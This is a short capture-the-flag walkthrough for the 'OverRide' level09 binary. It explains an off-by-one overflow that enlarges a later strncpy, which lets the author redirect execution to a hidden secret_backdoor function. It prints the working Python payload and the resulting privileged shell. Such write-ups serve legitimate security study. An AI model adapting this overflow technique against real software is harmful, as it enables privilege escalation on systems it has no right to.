# level09

After debugging our own code, here's the walkthrough:

The [target program](source.c) call the `set_username` function, copying 41 characters into a buffer of 40, we can overflow 1 byte, and in the `set_msg` function, the value that we can overflow in the previous function is used to determine how many characters are strncpy()`ied in the buffer, allowing us to overflow it too :

The first part of out payload will consist of 40 characters as padding and a `\xff` character, setting the value to 255.

The second part of our payload will contain 200 padding characters and then the address of the `secret_backdoor()` function, modifing the return of `set_msg` to jump to `secret_backdoor`

We now get shell access :3 :

```bash
level09@OverRide:~$ (python -c "print '\xff' * 41 + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]"; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
id
uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
```